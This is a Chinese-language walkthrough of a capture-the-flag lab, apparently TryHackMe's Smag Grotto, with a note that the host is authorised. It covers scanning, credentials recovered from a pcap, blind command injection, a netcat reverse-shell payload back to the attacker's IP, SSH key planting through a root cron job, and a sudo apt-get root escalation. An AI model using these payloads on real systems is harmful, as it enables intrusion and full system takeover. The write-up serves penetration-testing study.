# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~]
└─# nmap -sV -Pn 10.10.10.105
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 05:19 EDT
Nmap scan report for 10.10.10.105
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.30 seconds
```

经典CTF，一个ssh一个http

80端口首页没有有用的信息

## 爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.105                                                                                                                                                                                                                                                              130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.105/_21-11-06_05-21-14.txt

Error Log: /root/dirsearch/logs/errors-21-11-06_05-21-14.log

Target: http://10.10.10.105/

[05:21:15] Starting:   
[05:22:21] 200 -  402B  - /index.php                                        
[05:22:21] 200 -  402B  - /index.php/login/                                 
[05:22:27] 301 -  309B  - /mail  ->  http://10.10.10.105/mail/               
[05:22:27] 200 -    2KB - /mail/                                            

```

打开```mail```文件夹，把```dHJhY2Uy.pcap```下载到本地分析
```
┌──(root💀kali)-[~/tryhackme/SmagGrotto]
└─# wget http://10.10.10.105//aW1wb3J0YW50/dHJhY2Uy.pcap
--2021-11-06 05:25:24--  http://10.10.10.105//aW1wb3J0YW50/dHJhY2Uy.pcap
Connecting to 10.10.10.105:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1209 (1.2K) [application/vnd.tcpdump.pcap]
Saving to: ‘dHJhY2Uy.pcap’

dHJhY2Uy.pcap                                                                   100%[====================================================================================================================================================================================================>]   1.18K  --.-KB/s    in 0s      

2021-11-06 05:25:25 (47.4 MB/s) - ‘dHJhY2Uy.pcap’ saved [1209/1209]
```
## wireshark查看数据报
用wireshark打开这个文件

在第4个数据报发现一个登陆凭证
```
^POST /login.php HTTP/1.1

Host: development.smag.thm

User-Agent: curl/7.47.0

Accept: */*

Content-Length: 39

Content-Type: application/x-www-form-urlencoded



username=helpdesk&password=cH4nG3M3_n0w
```

## 分析和测试
我们把```development.smag.thm```加到kali的hosts文件
```
echo "10.10.10.105 development.smag.thm" >> /etc/hosts
```

打开```development.smag.thm```用上面的凭证登陆，显示一个命令行输入页面

我们尝试在页面上输入一些测试命令，但是页面上没有任何回显，用burpsuite监听，我们看到http的请求是这样的
```
POST /admin.php HTTP/1.1

Host: development.smag.thm

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 39

Origin: http://development.smag.thm

Connection: close

Referer: http://development.smag.thm/admin.php

Cookie: PHPSESSID=kp5dqemn1plrpuk787gi7qlvh2

Upgrade-Insecure-Requests: 1



command=ls&submit=submit
```

放到repeater尝试各种命令，但是页面没有任何回显。此时我怀疑其实命令是被执行了，只是没有在web上打印命令的结果，为了证明，我们尝试向kali机发送icmp包

burpsuite修改payload为：
```
command=ping 10.13.21.169&submit=submit
```

在kali开启icmp包监听,收到了icmp包，证明了我的猜想。

```
┌──(root💀kali)-[~]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
05:59:01.605463 IP development.smag.thm > 10.13.21.169: ICMP echo request, id 1157, seq 1, length 64
05:59:01.605555 IP 10.13.21.169 > development.smag.thm: ICMP echo reply, id 1157, seq 1, length 64
05:59:02.609787 IP development.smag.thm > 10.13.21.169: ICMP echo request, id 1157, seq 2, length 64
05:59:02.609801 IP 10.13.21.169 > development.smag.thm: ICMP echo reply, id 1157, seq 2, length 64
05:59:03.605527 IP development.smag.thm > 10.13.21.169: ICMP echo request, id 1157, seq 3, length 64
05:59:03.605563 IP 10.13.21.169 > development.smag.thm: ICMP echo reply, id 1157, seq 3, length 64
05:59:04.606276 IP development.smag.thm > 10.13.21.169: ICMP echo request, id 1157, seq 4, length 64
05:59:04.606312 IP 10.13.21.169 > development.smag.thm: ICMP echo reply, id 1157, seq 4, length 64
05:59:05.610149 IP development.smag.thm > 10.13.21.169: ICMP echo request, id 1157, seq 5, length 64
05:59:05.610185 IP 10.13.21.169 > development.smag.thm: ICMP echo reply, id 1157, seq 5, length 64
05:59:06.609349 IP development.smag.thm > 10.13.21.169: ICMP echo request, id 1157, seq 6, length 64
05:59:06.609385 IP 10.13.21.169 > development.smag.thm: ICMP echo reply, id 1157, seq 6, length 64

```

## 拿到初始shell
我们使用下面payload拿到反弹的webshell：
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f
```

收到反弹shell：
```
┌──(root💀kali)-[~/tryhackme/SmagGrotto]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.10.105] 49066
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 提权到jake
```/home```目录下有一个用户文件夹```/jake```，但是当前账号没有权限查看

传linpeas，发现root下有一个定时任务

```*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys```

每一分钟定时把```/opt/.backups/jake_id_rsa.pub.backup```里的内容写到```/home/jake/.ssh/authorized_keys```


把我本地的id_rsa.pub写到```/home/jake/.ssh/authorized_keys```
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXMYce9FPGn7FNt1MeNFTb2iTy917/1tzSKdRWnV4u2FmMUT85u92xUwpudizoAn10Bb7Y9r4813I3KjTzYO2OlJSCqQ4+PB+VI9/0dE67sInXsQJfdnXfguuA+oVzEU1QPCqCVuSt4pQaiXCeo0GmTiVZyVBNaJJoZCtNipqL/zyO5Avb6yfnxSYDusIPDuUWnJNBI9tE48MBDW0zDYdEajCddu2AjusHNNlS9nxgOqKulpsLM54/c2X5ttDp+DdYuQikc2Ju9MIDQE0og+W6QrtCF3FmKXMZxkU5OFTOmtfdg2U3OPoU1GKFOLks0tgglco9oDuO5qYHuD4/v7nRUtlTweCAOXDvGOItAB58uw2J8wINs6k/UrCL0or/tJ33vaoDFSI47WjRWNwEGNY+ESRjK1sbQFOdFGG2F4TvhWWv+mEEEKWtXlwBHYokIwRUzNy/s1cuMboUl6IqnorlCnLxazjx4/1VBm4Cu8j0cfa6VuzyiL+khSoz4RPG9Lc= root@kali" >> /opt/.backups/jake_id_rsa.pub.backup
```

直接无密码登录到jake的ssh
```
┌──(root💀kali)-[~/.ssh]
└─# ssh jake@10.10.176.249          
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ ls
user.txt
```

拿到user.txt


# 提权到root
查看sudo权限
```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get

```

用apt-get命令提权到root，拿到root.txt
```
jake@smag:~$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# ls /root
root.txt
```